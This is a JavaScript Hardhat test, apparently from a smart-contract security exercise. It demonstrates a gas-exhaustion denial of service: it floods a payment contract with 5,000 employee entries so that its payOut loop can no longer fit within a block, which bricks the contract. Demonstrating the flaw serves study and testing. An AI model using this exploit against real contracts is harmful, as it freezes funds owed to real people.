const { expect } = require("chai");
const { ethers } = require("hardhat");

// The payOut functions loops all employees at once to send their payments. We can artificially
// add employees to increase the gas usage so that it won't even fit an entire block, effectively
// bricking the contract. The deployed contract wasn't funded initially, but we can use
// FundContract to send some ETH.
// Steps:
// 1- Add employees to the contract. Here we are sending 10 batches of 500.
// 2- Fund the contract using FundContract (we are sending 1 wei per employee).
// 3- Calling payOut now reverts with out of gas, even when setting the block limit (30M).
describe("DistributePayments", function () {
  let payments;

  beforeEach(async function() {
    const DistributePayments = await ethers.getContractFactory("DistributePayments");
    payments = await DistributePayments.deploy([]);
  });

  it("can be hacked", async function() {
    const [, bob] = await ethers.getSigners();

    const employees = Array(500).fill(bob.address);

    for (let i = 0; i < 10; i++) {
      await payments.addEmployees(employees);
    }

    const FundContract = await ethers.getContractFactory("FundContract");
    const fundContract = await FundContract.deploy();
    await fundContract.deployed();

    await fundContract.fund(payments.address, { value: 500 * 10 });

    await expect(payments.payOut({ gasLimit: 30_000_000 })).to.be.reverted;
  });
});
